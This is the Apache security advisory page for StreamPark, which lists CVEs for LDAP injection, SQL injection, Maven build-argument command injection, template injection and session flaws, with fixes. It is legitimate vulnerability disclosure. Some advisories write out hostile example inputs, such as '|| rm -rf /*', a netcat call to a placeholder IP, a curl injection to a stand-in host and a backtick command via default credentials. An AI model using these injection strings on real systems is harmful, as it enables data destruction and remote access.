---
title: Apache StreamPark security advisories
description: Security information for Apache StreamPark
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache StreamPark? You can read more about the projects' security policy on their [security page](https://streampark.apache.org/community/security/), and email your report to the [Apache Security Team](mailto:security@apache.org).

# Advisories

This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. It may also lack details found on the [project security page](https://streampark.apache.org/community/security/). If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)
{.bg-warning}

## LDAP Injection Vulnerability ## { #CVE-2022-45801 }

CVE-2022-45801 [\[CVE json\]](./CVE-2022-45801.cve.json) [\[OSV json\]](./CVE-2022-45801.osv.json)



_Last updated: 2023-05-01T14:50:06.013Z_

### Affected

* Apache StreamPark (incubating) from 1.0.0 before 2.0.0


### Description

<div><div><span style="background-color: rgb(255, 255, 255);">Apache StreamPark 1.0.0 to 2.0.0 have a LDAP injection vulnerability.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP Injection is an attack used to exploit web based applications</span><br><span style="background-color: rgb(255, 255, 255);">that construct LDAP statements based on user input. When an</span><br><span style="background-color: rgb(255, 255, 255);">application fails to properly sanitize user input, it's possible to</span><br><span style="background-color: rgb(255, 255, 255);">modify LDAP statements through techniques similar to SQL Injection.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP injection attacks could result in the granting of permissions to</span><br><span style="background-color: rgb(255, 255, 255);">unauthorized queries, and content modification inside the LDAP tree.</span><br><span style="background-color: rgb(255, 255, 255);">This risk may only occur when the user logs in with ldap, and the user</span><br><span style="background-color: rgb(255, 255, 255);">name and password login will not be affected, Users of the affected</span><br><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span><br><br></div></div><br>

### References
* https://lists.apache.org/thread/xbkwwpkp3n2rs2wcxg8l26mhsftxwwr9


## Upload any file to any directory ## { #CVE-2022-45802 }

CVE-2022-45802 [\[CVE json\]](./CVE-2022-45802.cve.json) [\[OSV json\]](./CVE-2022-45802.osv.json)



_Last updated: 2023-06-26T10:23:44.595Z_

### Affected

* Apache StreamPark (incubating) from 1.0.0 before 2.0.0


### Description

<div><div><span style="background-color: var(--wht);">Streampark allows any users to upload a jar as application, but there is no mandatory verification of the uploaded file type, causing users to upload some high-risk files, and may upload them to any directory,&nbsp;</span><span style="background-color: var(--wht);">Users of the affected versions should upgrade to Apache StreamPark 2.0.0 or later</span></div><br></div><br><br>

### References
* https://lists.apache.org/thread/thwl1v2h6r3c21x1qwff08o57qzjnst6


## Logic error causing any account reset ## { #CVE-2022-46365 }

CVE-2022-46365 [\[CVE json\]](./CVE-2022-46365.cve.json) [\[OSV json\]](./CVE-2022-46365.osv.json)



_Last updated: 2023-05-01T14:53:47.030Z_

### Affected

* Apache StreamPark (incubating) from 1.0.0 before 2.0.0


### Description

<span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255);"><div><div>Apache StreamPark 1.0.0 <span style="background-color: rgb(255, 255, 255);">before</span> 2.0.0 When the user successfully logs in, to modify his profile, the username will be passed to the server-layer&nbsp;as a parameter, but not verified whether the user name is the currently logged user and whether the user is legal, This will allow malicious attackers to send any username to modify and reset the account,&nbsp;<span style="background-color: rgb(255, 255, 255);">Users of the affected&nbsp;</span><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span></div></div></span></span><br>

### References
* https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h


## Authenticated system users could trigger SQL injection vulnerability ## { #CVE-2023-30867 }

CVE-2023-30867 [\[CVE json\]](./CVE-2023-30867.cve.json) [\[OSV json\]](./CVE-2023-30867.osv.json)



_Last updated: 2023-12-15T12:13:59.544Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.2


### Description

<div><span style="background-color: var(--wht);">In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.</span><div><span style="background-color: var(--wht);"><br></span></div><br><div>Mitigation:</div><div><br></div><span style="background-color: rgb(255, 255, 255);">Users are recommended to upgrade to version 2.1.2, which fixes the issue.</span><br><br></div><br><p></p>

### References
* https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2


## Authenticated system users could trigger remote command execution ## { #CVE-2023-49898 }

CVE-2023-49898 [\[CVE json\]](./CVE-2023-49898.cve.json) [\[OSV json\]](./CVE-2023-49898.osv.json)



_Last updated: 2023-12-15T12:13:22.953Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.2


### Description

<div>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><br><div>Mitigation:<br><br></div>all users&nbsp;<span style="background-color: var(--wht);">should upgrade to 2.1.2</span><div><br></div><br><div>Example:<br><br><div><p></p><div>##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":<br><br><span style="background-color: var(--wht);">/usr/share/java/maven-3/conf/settings.xml || rm -rf /*</span><br></div><p></p></div></div><div><div>/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;</div><br></div></div><p></p>

### References
* https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3


## Unchecked SQL query fields trigger SQL injection vulnerability ## { #CVE-2023-52290 }

CVE-2023-52290 [\[CVE json\]](./CVE-2023-52290.cve.json) [\[OSV json\]](./CVE-2023-52290.osv.json)



_Last updated: 2024-07-16T07:37:36.828Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.4


### Description

<br>In streampark-console the list pages(e.g: application pages), users can sort page by field. This sort field is sent from the front-end to the back-end, and the SQL query is generated using this field. However, because this sort field isn't validated, there is a risk of SQL injection vulnerability.&nbsp;The attacker must successfully log into the system to launch an attack, which may cause data leakage. Since no data will be written, <span style="background-color: rgb(255, 255, 255);">so this is a low-impact vulnerability.</span><br><br><div><div>Mitigation:<br><br>all users should upgrade to 2.1.4,  Such parameters will be blocked.<br><br></div></div><br><br>

### References
* https://lists.apache.org/thread/t3mcm8pb65d9gj3wrgtj9sx9s2pfvvl3


### Credits
* thiscodecc of MoyunSec Vlab and Bing (reporter)


## Unchecked maven build params could trigger remote command execution ## { #CVE-2023-52291 }

CVE-2023-52291 [\[CVE json\]](./CVE-2023-52291.cve.json) [\[OSV json\]](./CVE-2023-52291.osv.json)



_Last updated: 2024-07-17T08:16:10.844Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.4


### Description

In streampark, the project module integrates Maven's compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><div><br><br>Background:<br><br>In the "Project" module, the maven build args&nbsp;<span style="background-color: rgb(255, 255, 255);">&nbsp;“&lt;” operator causes command injection. e.g</span> : “&lt; (curl&nbsp;<a target="_blank" rel="nofollow" href="http://xxx.com">http://xxx.com</a>)” will be executed as a command injection,<br><br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4,&nbsp; The "&lt;" operator will blocked。</span><div><br></div></div><p></p><br><br>

### References
* https://lists.apache.org/thread/pl6xgzoqrl4kcn0nt55zjbsx8dn80mkf


### Credits
* thiscodecc of MoyunSec Vlab and Bing (finder)


## session not invalidated after logout ## { #CVE-2024-29070 }

CVE-2024-29070 [\[CVE json\]](./CVE-2024-29070.cve.json) [\[OSV json\]](./CVE-2024-29070.osv.json)



_Last updated: 2025-02-06T14:33:02.169Z_

### Affected

* Apache StreamPark from 1.0.0 before 2.1.4


### Description

On versions before 2.1.4,&nbsp;session is not invalidated after logout. When the user logged in successfully, the Backend service returns "Authorization" as the front-end authentication credential. "Authorization" can still initiate requests and access data even after logout.<br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br><br>

### References
* https://lists.apache.org/thread/zslblrz1l0n9t67mqdv42yv75ncfn9zl


### Credits
* L0ne1y (reporter)


## Information leakage vulnerability ## { #CVE-2024-29120 }

CVE-2024-29120 [\[CVE json\]](./CVE-2024-29120.cve.json) [\[OSV json\]](./CVE-2024-29120.osv.json)



_Last updated: 2024-07-17T14:59:02.804Z_

### Affected

* Apache StreamPark from 2.0.0 before 2.1.4


### Description

In Streampark (version &lt; <span style="background-color: rgb(255, 255, 255);">2.1.4</span>), when a user logged in successfully, the Backend service would return "Authorization" as the front-end authentication credential.  User can use this credential to request other users' information, including the administrator's username, password, salt value, etc.&nbsp;<br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br>

### References
* https://lists.apache.org/thread/y3oqz7l8vd7jxxx3z2khgl625nvfr60j


### Credits
* L0ne1y (reporter)


## FreeMarker SSTI RCE Vulnerability ## { #CVE-2024-29178 }

CVE-2024-29178 [\[CVE json\]](./CVE-2024-29178.cve.json) [\[OSV json\]](./CVE-2024-29178.osv.json)



_Last updated: 2024-07-18T11:15:55.181Z_

### Affected

* Apache StreamPark from 1.0.0 before 2.1.4


### Description

<span style="background-color: rgb(255, 255, 255);">On versions before 2.1.4, a user could log in and perform a template injection attack resulting in Remote Code Execution on the server,&nbsp;The attacker must successfully log into the system to launch an attack, so this is a moderate-impact vulnerability.<br></span><br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br>

### References
* https://lists.apache.org/thread/n6dhnl68knpxy80t35qxkkw2691l8sfn


### Credits
* L0ne1y (reporter)


## maven build params could trigger remote command execution ## { #CVE-2024-29737 }

CVE-2024-29737 [\[CVE json\]](./CVE-2024-29737.cve.json) [\[OSV json\]](./CVE-2024-29737.osv.json)



_Last updated: 2024-07-17T08:21:09.036Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.4


### Description

In streampark, the project module integrates Maven's compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><div><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4<br><br>Background info:<span style="background-color: rgb(255, 255, 255);"><br><span style="background-color: rgb(255, 255, 255);"><br>Log in to Streampark using the default username (e.g. test1, test2, test3) and the default password (streampark). Navigate to the Project module, then add a new project. Enter the git repository address of the project and input `touch /tmp/success_2.1.2` as the "Build Argument". Note that there is no verification and interception of the special character "`". As a result, you will find that this injection command will be successfully executed after executing the build.<br></span></span><br><div>In the latest version, the special symbol ` is intercepted.</div><div><div><div><div></div></div></div></div></span><div><br><br></div></div><p></p><br>

### References
* https://lists.apache.org/thread/xhx7jt1t24s6d7o435wxng8t0ojfbfh5


### Credits
* L0ne1y (reporter)


## Apache StreamPark IDOR Vulnerability ## { #CVE-2024-34457 }

CVE-2024-34457 [\[CVE json\]](./CVE-2024-34457.cve.json) [\[OSV json\]](./CVE-2024-34457.osv.json)



_Last updated: 2024-09-11T11:03:06.370Z_

### Affected

* Apache StreamPark from 1.0.0 before 2.1.4


### Description

<div>On versions before 2.1.4, after a regular user successfully logs in, they can manually make a request using the authorization token to view everyone's user flink information, including executeSQL and config.<br></div><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br><br><br>

### References
* https://lists.apache.org/thread/brlfrmvw9dcv38zoofmhxg7qookmwn7j


### Credits
* L0ne1y (reporter)


## SQL injection vulnerability ## { #CVE-2024-48988 }

CVE-2024-48988 [\[CVE json\]](./CVE-2024-48988.cve.json) [\[OSV json\]](./CVE-2024-48988.osv.json)



_Last updated: 2025-08-22T16:18:41.486Z_

### Affected

* Apache StreamPark from 2.1.4 before 2.1.6


### Description

<p>SQL Injection vulnerability in Apache StreamPark.</p><p>This issue affects Apache StreamPark: from 2.1.4 before 2.1.6.</p><p>Users are recommended to upgrade to version 2.1.6, which fixes the issue.</p><br>This vulnerability is present only in the distribution package (SpringBoot platform) and does not involve Maven artifacts.<br>It can only be exploited after a user has successfully logged into the platform (implying that the attacker would first need to compromise the login authentication). <br>As a result, the associated risk is considered relatively low.<br><p><br></p>

### References
* https://lists.apache.org/thread/26ng8388l93zwjrst560cbjz9x7wpq1s


### Credits
* Xingchen Chen, Ze Jin, wh1t3p1g, yhbl, Qixu Liu  Institute of Information Engineering, CAS (reporter)
